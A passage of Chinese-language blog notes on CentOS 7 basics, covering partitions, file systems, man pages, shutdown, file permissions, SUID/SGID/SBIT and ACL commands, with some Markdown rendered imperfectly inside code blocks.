title="关于centos名称解读:"></a>关于centos名称解读:</h4><p>centos-7-x86_64-Everything-1503-01.iso</p><ul><li>7表示大版本</li><li>x86_64代表64位操作系统</li><li>Everything代表全功能版本</li><li>1503代表是2015年3月发布</li><li>01代表属于centos7.1</li></ul><h3 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h3><ul><li><strong>标准分区</strong>：类似&#x2F;dev&#x2F;vda1</li><li><strong>LVM</strong>：一种可以弹性增加或缩小文件系统容量的分区</li><li><strong>LVM精简配置</strong>：相当于LVM的高级版</li></ul><h4 id="文件系统选项"><a href="#文件系统选项" class="headerlink" title="文件系统选项"></a>文件系统选项</h4><ul><li><strong>ext2&#x2F;ext3&#x2F;ext4</strong>：Linux早期使用的文件系统,ext3&#x2F;ext4文件系统多了日志功能，对于系统的恢复比较快速。不常用了，嘤嘤嘤！</li><li><strong>swap</strong>：磁盘模拟为内存的交换分区,不会挂载到树目录,交换分区不需要指定挂载点</li><li><strong>BIOS Boot</strong>：GPT分区表可能会用到的东西若使用MBR就用不到了</li><li><strong>xfs</strong>：centos7默认的文件系统，对于大容量磁盘管理很好,格式化很快</li><li><strong>vfat</strong>：同时支持Windows和Linux系统，可以进行数据交换</li></ul><blockquote><p>安装系统后所有的root密码等都会记录到&#x2F;root&#x2F;anaconda-ks.cfg中;</p></blockquote><h2 id="命令部分"><a href="#命令部分" class="headerlink" title="命令部分"></a>命令部分</h2><h3 id="切换X-Windows-与-命令行模式"><a href="#切换X-Windows-与-命令行模式" class="headerlink" title="切换X Windows 与 命令行模式"></a>切换X Windows 与 命令行模式</h3><blockquote><p>Ctrl + Alt + F1 <strong>切换到X Windows窗口</strong><br>Ctrl + Alt + F2<del>F6 **切换到tty2</del>tty6命令行模式**</p></blockquote><p><em><strong>如果安装centos7时默认的是命令行界面，那么tty1~tty6会被命令行界面占用</strong></em></p><p><strong>centos7环境下，启动完成默认提供一个tty，需要切换时才产生额外的tty</strong></p><h3 id="一般的命令格式："><a href="#一般的命令格式：" class="headerlink" title="一般的命令格式："></a>一般的命令格式：</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">command</span> [-<span class="hljs-keyword">options</span>] parameter1 parameter2<br></code></pre></td></tr></table></figure><ul><li>command 一般是命令或者可执行文件</li><li>如果命令符太长了可以使用\（反斜杠，嘤嘤嘤）来连接</li><li>Linux中，<em><strong>英文大小写字母是不一样的</strong></em></li></ul><h3 id="如果输入命令乱码"><a href="#如果输入命令乱码" class="headerlink" title="如果输入命令乱码"></a>如果输入命令乱码</h3><p>可能时Linux检测为中文编码修改为英文即可</p><blockquote><p>[root@YH ~]# local<br>-bash: local: can only be used in a function<br>[root@YH ~]# locale<br>LANG&#x3D;en_US.utf8<br>LC_CTYPE&#x3D;”en_US.utf8”<br>LC_NUMERIC&#x3D;”en_US.utf8”<br>LC_TIME&#x3D;”en_US.utf8”<br>LC_COLLATE&#x3D;”en_US.utf8”<br>LC_MONETARY&#x3D;”en_US.utf8”<br>LC_MESSAGES&#x3D;”en_US.utf8”<br>LC_PAPER&#x3D;”en_US.utf8”<br>LC_NAME&#x3D;”en_US.utf8”<br>LC_ADDRESS&#x3D;”en_US.utf8”<br>LC_TELEPHONE&#x3D;”en_US.utf8”<br>LC_MEASUREMENT&#x3D;”en_US.utf8”<br>LC_IDENTIFICATION&#x3D;”en_US.utf8”<br>LC_ALL&#x3D;</p><p>修改为英文</p><p>[root@YH ~]# LANG&#x3D;en_US.utf8<br>[root@YH ~]# export LC_ALL&#x3D;en_US.utf8</p></blockquote><h3 id="linux基础命令系列"><a href="#linux基础命令系列" class="headerlink" title="linux基础命令系列"></a>linux基础命令系列</h3><ul><li>date:显示时间日期</li><li>cal:显示日历</li><li>bc:简单的计算器</li></ul><h3 id="切换root账户"><a href="#切换root账户" class="headerlink" title="切换root账户"></a>切换root账户</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">su</span> -<br></code></pre></td></tr></table></figure><h3 id="格式化输出日期"><a href="#格式化输出日期" class="headerlink" title="格式化输出日期"></a>格式化输出日期</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">date</span> +%Y/%m/%d<br></code></pre></td></tr></table></figure><h3 id="格式化输出时间"><a href="#格式化输出时间" class="headerlink" title="格式化输出时间"></a>格式化输出时间</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">date</span> +%H:%M<br></code></pre></td></tr></table></figure><h3 id="日历命令"><a href="#日历命令" class="headerlink" title="日历命令"></a>日历命令</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">cal [<span class="hljs-built_in">month</span>] [<span class="hljs-built_in">year</span>]<br></code></pre></td></tr></table></figure><h3 id="热键的使用"><a href="#热键的使用" class="headerlink" title="热键的使用"></a>热键的使用</h3><p><strong>[Tab]</strong></p><ul><li>[Tab]接在一串命令的第一个字段后面则为【命令补全】</li><li>[Tab]接在一串命令的第二个字段后面则为【文件补全】</li></ul><p><strong>[Ctrl+D]</strong></p><p>通常代表键盘输入结束，或者替代<strong>exit</strong>命令</p><p>[shift+{page up}&#x2F;{page dwon}]</p><p>翻页，命令过长屏幕翻页</p><h3 id="如何用了解命令的使用"><a href="#如何用了解命令的使用" class="headerlink" title="如何用了解命令的使用"></a>如何用了解命令的使用</h3><p>使用–help可以查看基本用法使用 man 加命令可以看到更详细的用法</p><p>例如输入man date后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">DATE(1)                                             User Commands                                             DATE(1)<br><br>NAME<br>       <span class="hljs-built_in">date</span> - <span class="hljs-built_in">print</span> or <span class="hljs-built_in">set</span> the system <span class="hljs-built_in">date</span> and time<br><br>SYNOPSIS<br>       <span class="hljs-built_in">date</span> [OPTION]... [+FORMAT]<br>       <span class="hljs-built_in">date</span> [-u|--utc|--universal] [MMDDhhmm[[CC]YY][.ss]]<br><br>DESCRIPTION<br>       Display the current time <span class="hljs-keyword">in</span> the given FORMAT, or <span class="hljs-built_in">set</span> the system <span class="hljs-built_in">date</span>.<br><br>       Mandatory arguments to long options are mandatory <span class="hljs-keyword">for</span> short options too.<br><br>       -d, --<span class="hljs-built_in">date</span>=STRING<br>              display time described by STRING, not <span class="hljs-string">&#x27;now&#x27;</span><br><br>       -f, --file=DATEFILE<br>              like --<span class="hljs-built_in">date</span> once <span class="hljs-keyword">for</span> each line of DATEFILE<br><br>       -I[TIMESPEC], --iso-8601[=TIMESPEC]<br>              output  <span class="hljs-built_in">date</span>/time <span class="hljs-keyword">in</span> ISO 8601 format.  TIMESPEC=<span class="hljs-string">&#x27;date&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">date</span> only (the default), <span class="hljs-string">&#x27;hours&#x27;</span>, <span class="hljs-string">&#x27;minutes&#x27;</span>,<br>              <span class="hljs-string">&#x27;seconds&#x27;</span>, or <span class="hljs-string">&#x27;ns&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">date</span> and time to the indicated precision.<br><br>       -r, --reference=FILE<br>.....<br></code></pre></td></tr></table></figure><p>这里可以看到有一个DATE(1)这个意思是一般用户可以使用的命令还有更多的数字解析如(从man man命令查看)</p><blockquote><pre><code class="hljs">              1   Executable programs or shell commands                2   System calls (functions provided by the kernel)                3   Library calls (functions within program libraries)                4   Special files (usually found in /dev)                5   File formats and conventions eg /etc/passwd                6   Games                7   Miscellaneous (including macro packages and conventions), e.g. man(7), groff(7)                8   System administration commands (usually only for root)                9   Kernel routines [Non standard]</code></pre></blockquote><p>1(用户可以在shell中可以操作的命令或者可执行文件)、5(配置文件或是某些文件的格式)、8(系统管理员可用的管理命令)</p><p>上面这三个含义很重要</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs bash">CAT(1)                                              User Commands                                              CAT(1)<br><br>NAME<br>       <span class="hljs-built_in">cat</span> - concatenate files and <span class="hljs-built_in">print</span> on the standard output<br><br>SYNOPSIS<br>       <span class="hljs-built_in">cat</span> [OPTION]... [FILE]...<br><br>DESCRIPTION<br>       Concatenate FILE(s), or standard input, to standard output.<br><br>       -A, --show-all<br>              equivalent to -vET<br><br>       -b, --number-nonblank<br>              number nonempty output lines, overrides -n<br><br>       -e     equivalent to -vE<br><br>       -E, --show-ends<br>              display $ at end of each line<br><br>       -n, --number<br>              number all output lines<br><br>       -s, --squeeze-blank<br>              suppress repeated empty output lines<br><br>       -t     equivalent to -vT<br><br>       -T, --show-tabs<br>              display TAB characters as ^I<br><br>       -u     (ignored)<br><br>       -v, --show-nonprinting<br>              use ^ and M- notation, except <span class="hljs-keyword">for</span> LFD and TAB<br><br>       --<span class="hljs-built_in">help</span> display this <span class="hljs-built_in">help</span> and <span class="hljs-built_in">exit</span><br><br>       --version<br>              output version information and <span class="hljs-built_in">exit</span><br><br>       With no FILE, or when FILE is -, <span class="hljs-built_in">read</span> standard input.<br><br>EXAMPLES<br>       <span class="hljs-built_in">cat</span> f - g<br>              Output f<span class="hljs-string">&#x27;s contents, then standard input, then g&#x27;</span>s contents.<br><br>       <span class="hljs-built_in">cat</span>    Copy standard input to standard output.<br><br>       GNU   coreutils   online   <span class="hljs-built_in">help</span>:  &lt;http://www.gnu.org/software/coreutils/&gt;  Report  <span class="hljs-built_in">cat</span>  translation  bugs  to<br>       &lt;http://translationproject.org/team/&gt;<br><br>AUTHOR<br>       Written by Torbjorn Granlund and Richard M. Stallman.<br><br>COPYRIGHT<br>       Copyright  ©  2013  Free  Software  Foundation,  Inc.   License  GPLv3+:  GNU   GPL   version   3   or   later<br>       &lt;http://gnu.org/licenses/gpl.html&gt;.<br>       This  is  free software: you are free to change and redistribute it.  There is NO WARRANTY, to the extent per‐<br>       mitted by law.<br><br>SEE ALSO<br>       <span class="hljs-built_in">tac</span>(1)<br><br>       The full documentation <span class="hljs-keyword">for</span> <span class="hljs-built_in">cat</span> is maintained as a Texinfo manual.  If the info and <span class="hljs-built_in">cat</span> programs  are  properly<br>       installed at your site, the <span class="hljs-built_in">command</span><br><br>              info coreutils <span class="hljs-string">&#x27;cat invocation&#x27;</span><br><br>       should give you access to the complete manual.<br><br>GNU coreutils 8.22                                  November 2020                                              CAT(1)<br><br></code></pre></td></tr></table></figure><p>再一次解析man page每一个区域有着不同的含义</p><ul><li>NAME 简短的命令数据说明</li><li>SYNOPSIS 简短的命令语法简介</li><li>DESCRIPTION 较为完整的说法,建议仔细看</li><li>OPTIONS 可选项说明</li><li>COMMANDS 当这个程序在执行的时候,可以在此程序中执行的命令</li><li>FILES 这个程序或数据所使用或参考或连接到的某些文件</li><li>SEE ALSO 可以参照跟这个命令或数据有相关的其他说明</li><li>EXAMPLE 可以参考的实例</li></ul><blockquote><p>使用info也可以查看</p></blockquote><blockquote><p>&#x2F;usr&#x2F;share下面基本都是帮助文档安装的软件基本的帮助都是在这个文档中</p></blockquote><h3 id="有关另一个文档编辑器"><a href="#有关另一个文档编辑器" class="headerlink" title="有关另一个文档编辑器"></a>有关另一个文档编辑器</h3><p>nano</p><p>使用命令后的page</p><blockquote><p>GNU nano 2.3.1                             File: 1.txt </p><p>^G Get Help         ^O WriteOut         ^R Read File        ^Y Prev Page        ^K Cut Text         ^C Cur Pos<br>^X Exit             ^J Justify          ^W Where Is         ^V Next Page        ^U UnCut Text       ^T To Spell</p></blockquote><p>第一行,为版本号和文件名</p><p>下面几行为基本操作^代表ctrl</p><p>configure命令</p><p>configure文件是bai一个可执行的脚本文件，它有很多选du项，在待安装的zhi源码目录下使用命令.&#x2F;configure –help可以输出dao详细的选项列表。</p><p>其中–prefix选项是配置安装目录，如果不配置该选项，安装后可执行文件默认放在&#x2F;usr &#x2F;local&#x2F;bin，库文件默认放在&#x2F;usr&#x2F;local&#x2F;lib，配置文件默认放在&#x2F;usr&#x2F;local&#x2F;etc，其它的资源文件放在&#x2F;usr &#x2F;local&#x2F;share，比较凌乱。</p><p>如果配置了–prefix，如：</p><p>$ .&#x2F;configure –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;test1</p><p>scp上传文件</p><h3 id="正确的关机方法"><a href="#正确的关机方法" class="headerlink" title="正确的关机方法"></a>正确的关机方法</h3><p><strong>who</strong>：查看目前有谁在线</p><p><strong>netstat -a</strong>：查看网络的联机状态</p><p><strong>ps -aux</strong>：查看后台执行的程序</p><p><strong>sync</strong>：将数据同步写入硬盘</p><p><strong>shutdown</strong>：常用的关机命令</p><p><strong>reboot、halt、poweroff</strong>：重新启动、关机</p><h4 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">shutdown <span class="hljs-selector-attr">[-krhc]</span> <span class="hljs-selector-attr">[时间]</span> <span class="hljs-selector-attr">[警告信息]</span><br></code></pre></td></tr></table></figure><ul><li>-k：不要真的关机，只是发送警告信息出去</li><li>-r：在将系统的服务停掉之后就重新启动（常用）</li><li>-h：将系统的服务停掉以后，立即关机（常用）</li><li>-c：取消已经在进行的shutdown命令内容</li><li>时间：指定系统关机时间，若没指定，默认一分钟自动进行</li></ul><h2 id="文件权限与目录配置"><a href="#文件权限与目录配置" class="headerlink" title="文件权限与目录配置"></a>文件权限与目录配置</h2><h3 id="用户与组"><a href="#用户与组" class="headerlink" title="用户与组"></a>用户与组</h3><p>所有用户的相关信息都放在&#x2F;etc&#x2F;passwd</p><p>个人的密码保存在&#x2F;etc&#x2F;shadow文件夹中</p><p>所有的组名都记录在&#x2F;etc&#x2F;group中</p><p><em><strong>这三个文件夹不可随便删除</strong></em></p><p>不解释了不明白自己百度</p><h3 id="基本命令统计"><a href="#基本命令统计" class="headerlink" title="基本命令统计"></a>基本命令统计</h3><ul><li><p>ls:显示文件名以及属性 -al所有、-l –full-time显示所有完整的时间格式 -S排序</p></li><li><p>chgrp :修改文件所属用户组 -R递归进行修改联通子目录下的所有文件</p></li><li><p>chown :修改文件所属用户 -R同上、也可以修改用户组</p><ul><li>chown 用户名 文件名(修改所属用户)</li><li>chown 用户名:组名 文件名(修改所属用户和组)</li></ul></li><li><p>chmod :修改文件权限</p><ul><li>三种修改模式 +(增加权限) -(删除权限) &#x3D;(设置权限为)</li><li>太长了看这个吧..<a href="https://www.runoob.com/linux/linux-comm-chmod.html">https://www.runoob.com/linux/linux-comm-chmod.html</a></li></ul></li><li><p>cp    :复制文件</p></li></ul><h4 id="chmod修改权限，数字类型修改文件权限"><a href="#chmod修改权限，数字类型修改文件权限" class="headerlink" title="chmod修改权限，数字类型修改文件权限"></a>chmod修改权限，数字类型修改文件权限</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs linux">chmod [-R] xyz 文件或目录<br><br>xyz：数字类型的权限属性，为rwx属性数值的相加<br>-R：进行递归修改，连同子目录下的所有文件都会修改<br></code></pre></td></tr></table></figure><h4 id="chmod修改权限，符号类型修改文件权限"><a href="#chmod修改权限，符号类型修改文件权限" class="headerlink" title="chmod修改权限，符号类型修改文件权限"></a>chmod修改权限，符号类型修改文件权限</h4><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/rwx-standard-unix-permission-bits.png"></p><h4 id="文件属性详解"><a href="#文件属性详解" class="headerlink" title="文件属性详解"></a>文件属性详解</h4><blockquote><p>drwxr-xr-x   2 root root  4096 Aug 14 17:34 .pip</p></blockquote><p>例如上面的参数(用ls -al查出来的).</p><p>&#x3D;&#x3D;第一个属性&#x3D;&#x3D;</p><h5 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h5><p>第一个字符表示目录、文件、连接</p><ul><li><p>当为[d]时为目录</p></li><li><p>当为[-]则是文件</p></li><li><p>当为[|]则是连接</p></li><li><p>当为[b]表示为设备文件里面的可供存储的周边设备</p></li><li><p>若是[c]则表示属于设备文件属于串行端口设备,如键盘鼠标</p></li><li><blockquote><p>file 文件名     &#x2F;&#x2F;查看文件类型</p></blockquote></li></ul><p>接下来每三个字符一组分别又rwx组成,r代表可读,w代表可写,x代表可执行[-]代表没有权限(如果为目录的话没有x不能进入,w权限并不能代表可以删除文件)</p><p>权限对文件来说</p><p>r代表是否可以获取文件中的内容。</p><p>w代表是否能**修改、写入、新增、编辑(不包括删除该文件)**。</p><p>x代表该文件是否可执行，不像Windows一样用后缀名来代表文件是否可执行</p><p>权限对目录来说</p><p>r代表你可以查询该目录下内容(可以使用ls来查看)。</p><p>w建立新的文件或目录、删除已存在目录与文件（不论该文件的权限是什么）、对文件或者目录进行改名、移动该目录内的文件、目录位置。</p><p>x代表<strong>是否能进入该目录</strong></p><p>第一组代表文件拥有者（owner）可具备的权限,第二组为所属组（group）所具备的权限,第三组为其他人（others）的权限</p><hr><h5 id="文件默认权限"><a href="#文件默认权限" class="headerlink" title="文件默认权限"></a>文件默认权限</h5><p>当你建立一个新的文件或者文件夹的时候默认权限是什么?</p><p>用umask可以指定目前用户在建立文件或目录时候给的权限</p><p>umask 设置默认减掉的权限例如umask 777则变成新建文件什么权限不给 umask 000 则给予最高权限</p><p>-p以数字形式显示权限设置情况</p><p>-S以字符串方式显示</p><h3 id="文件隐藏属性"><a href="#文件隐藏属性" class="headerlink" title="文件隐藏属性"></a>文件隐藏属性</h3><ul><li>chattr 修改文件隐藏配置— 增加隐藏属性,-a 只能增加数据不能删除不能修改数据只有root才能设置属性 -i 不能删除、改名、设置连接、修改数据或新增数据只有root 才能修改属性</li><li>lsattr [-adR] 目录或文件 显示文件隐藏配置 —-  -a基本属性也显示 -d如果时目录进显示出本身属性而不是目录内的文件名 -R连通子目录一起显示</li></ul><p>第二个属性是有多少文件名连接到此节点.</p><p>第三个属性是文件或者目录拥有者.</p><p>第四个属性是文件的所属组.</p><p>第五个属性是文件大小</p><p>第六个属性是文件创建日期或是修改日期(月&#x2F;日,不是今年显示年)</p><h3 id="文件隐藏权限SUID-SGID-SBIT"><a href="#文件隐藏权限SUID-SGID-SBIT" class="headerlink" title="文件隐藏权限SUID,SGID,SBIT"></a>文件隐藏权限SUID,SGID,SBIT</h3><ul><li>SUID<ul><li>仅对二进制有效</li><li>执行者需要具有x权限</li><li>执行者将具有该程序的拥有者权限</li></ul></li><li>SGID<ul><li>对二进制有效<ul><li>执行者对于该程序需要具备x权限</li><li>执行者在执行的过程中会获得该程序用户组的支持</li></ul></li><li>对目录有效<ul><li>若用户具有r与x权限才能进入该目录</li><li>用户再次目录下的有效用户组会变成该组</li><li>用户再次目录下若具有w权限则用户缩新建的文件与此目录相同</li></ul></li></ul></li><li>SBIT<ul><li>只针对目录有效</li><li>当用户具有w、x权限，即具有写入的权限</li><li>当用户在该目录下建立文件或目录，仅有自己与root能删除该文件</li></ul></li></ul><h3 id="ACL特殊用户权限"><a href="#ACL特殊用户权限" class="headerlink" title="ACL特殊用户权限"></a>ACL特殊用户权限</h3><p>可以针对单一用户、单一文件或目录进行r、w、x权限设置</p><p>查看是否能够使用acl</p><blockquote><p>dmesg | grep -i acl</p><p>[root@YH ~]# dmesg | grep -i acl<br>[    1.411790] systemd[1]: systemd 219 running in system mode. (+PAM +AUDIT +SELINUX +IMA -APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 -SECCOMP +BLKID +ELFUTILS +KMOD +IDN)<br>[ 3572.030938] SGI XFS with ACLs, security attributes, no debug enabled</p></blockquote><ul><li><p>getfacl filename:获取某个文件&#x2F;目录的ACL设置选项</p><ul><li><p>几乎和下面一样</p></li><li><blockquote><p>[root@YH local]# getfacl myuser&#x2F;<br># file: myuser&#x2F;<br># owner: root<br># group: mygroup1<br># flags: -s-<br>user::rwx<br>user:user1:rwx<br>group::rwx<br>mask::rwx<br>other::—</p></blockquote></li></ul></li><li><p>setfacl 目标文件名:设置某个目录&#x2F;文件的ACL规范</p><ul><li><p>简单的 u:账号:权限</p><ul><li><p>u:特定账户</p></li><li><p>g:特定用户组</p></li><li><p>m:用户权限或者组权限必须在mask权限设置范围才有效,即最大允许的权限如果mask最大权限为r那么无论怎么设置权限最大都是r</p></li><li><p>&#96;&#96;&#96;bash<br>[root@YH local]# setfacl -m m::r myuser&#x2F;<br>[root@YH local]# getfacl myuser&#x2F;</p></li></ul><h1 id="file-myuser-x2F"><a href="#file-myuser-x2F" class="headerlink" title="file: myuser&#x2F;"></a>file: myuser&#x2F;</h1><h1 id="owner-root"><a href="#owner-root" class="headerlink" title="owner: root"></a>owner: root</h1><h1 id="group-mygroup1"><a href="#group-mygroup1" class="headerlink" title="group: mygroup1"></a>group: mygroup1</h1><h1 id="flags-s"><a href="#flags-s" class="headerlink" title="flags: -s-"></a>flags: -s-</h1><p>  user::rwx<br>  user:user1:rwx#effective:r–<br>  group::rwx#effective:r–<br>  mask::r–<br>  other::—</p><p>  [root@YH local]# su user1<br>  [user1@YH local]$ cd myuser&#x2F;<br>  bash: cd: myuser&#x2F;: Permission denied</p>  <figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">u:[g|u]:用户:权限,设置默认权限</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">-m :设置后续的ACL参数给文件使用</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">-x :删除后续的ACL</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">-b :删除所有ACL</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">-k :删除默认ACL参数</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">-R :递归设置ACL</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">-d :设置默认ACL只对目录有效(新建数据时会引用此默认值)</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&gt;[root@YH local]# setfacl -m u:user1:rwx myuser</span><br>    &gt;<br>    &gt;[root@YH local]# ll | grep &#x27;myuser&#x27;<br>    &gt;drwxrws---+  4 root mygroup1  4096 Sep 16 18:30 myuser[root@YH local]# ll | grep &#x27;myuser&#x27;<br>    &gt;drwxrws---+  4 root mygroup1  4096 Sep 16 18:30 myuser<br><br>  <span class="hljs-punctuation">&gt;</span> <span class="hljs-string">删除账号权限不用加权限等级如setfacl -x u:myuser1</span><br>  &gt;<br>  <span class="hljs-punctuation">&gt;</span> <span class="hljs-string">设置账号无权限权限不能为空可以用-代替如setfacl -x u:myuser1:-</span><br><br><br><br><span class="hljs-comment">### 文件类型以及扩展名</span><br><br>自己看吧~~~额https://www.cnblogs.com/peida/archive/2012/11/22/2781912.html<br><br><br><br><span class="hljs-comment">## 文件与目录管理</span><br><br>特殊目录<br><br>&gt;. 代表此目录<br>&gt;<br>&gt;..代表上层目录<br>&gt;<br>&gt;\-     代表前一个目录<br>&gt;<br>&gt;~ 代表当前身份的家<br>&gt;<br>&gt;~acc  代表这个身份的家(acc表示用户名)<br><br><span class="hljs-comment">### 文件与目录的查看：ls</span><br><br>&gt;默认显示的只有：**非隐藏的文件名、以文件名进行排序及文件名代表的颜色显示**<br>&gt;蓝色显示目录、白色显示一般文件<br><br><span class="hljs-bullet">-</span> <span class="hljs-string">-a:全部的文件，连同隐藏文件（开头为.文件）一起列出来（常用）</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">-A:全部的文件，连同隐藏的文件，但不包括.与..这两个目录</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">-d:仅列出目录本身，而不是列出目录内的文件数据（常用）</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">-f:直接列出结果，而不进行排序（ls默认会以文件名排序）</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">-Z:显示安全上下文</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">-F:根据文件、目录等信息，给予附加数据结构</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">*:代表可执行文件；/:代表目录；=:代表socket文件；|:代表FIFO文件</span><br>    -l:详细信息显示，包含文件的属性与权限等数据（常用）<br><br><br><span class="hljs-comment">### 目录处理命令</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">cd:切换</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">pwd:显示当前目录 **-P可以知道目录的真实路径**</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">mkdir:建立一个新目录 **-p可以一次建立多级目录，-m设置文件的权限，不使用默认权限**</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">rmdir:**删除一个空目录**，-p连同上层“空”目录也一起删除</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">rm -r xx 删除目录包括目录下的文件</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">cp:复制 </span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">-d若源文件为链接文件属性,则复制链接文件而不是文件本身 </span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">-f若文件存在且无法开启则删除后再试</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">-a 相当于-dr 